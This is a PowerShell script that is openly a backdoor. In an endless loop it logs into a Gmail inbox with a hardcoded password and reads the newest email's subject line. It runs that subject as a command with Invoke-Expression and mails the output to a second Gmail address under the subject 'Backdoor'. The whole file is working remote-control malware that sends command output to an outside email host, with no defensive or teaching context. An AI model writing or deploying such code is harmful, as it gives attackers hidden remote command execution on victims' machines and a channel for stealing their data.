while ($true){
$password = ConvertTo-SecureString 'Powershell' -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential powershellbd@gmail.com,$password

$webclient = new-object System.Net.WebClient
$webclient.Credentials = $credentials

[xml]$xml= $webclient.DownloadString("https://mail.google.com/mail/feed/atom")

if (!$xml) {return}

    if (($xml.feed.entry) -ne $NULL) {

        $hostcheck = $xml.feed.entry | Format-table -Hidetableheaders -Property title | out-string

            
        $id = $xml.feed.entry | select-object -first 1 | Format-table -Hidetableheaders -Property id | out-string

        if ($id -ne $lastid ) {

            $input = $xml.feed.entry | select-object -first 1 | Format-table -Hidetableheaders -Property title | out-string

            $command = Invoke-Expression $input | Out-String

            $parameters  = @{
                SmtpServer = 'smtp.gmail.com'
                Port = 587
                UseSsl = $true
                Credential = $credentials
                From = 'powershellbd@gmail.com'
                To = 'linuxdemouser@gmail.com'
                Subject = 'Backdoor'
                Body = $command
            }
 
            Send-MailMessage @parameters
            $lastid = $id
        }

    }
}
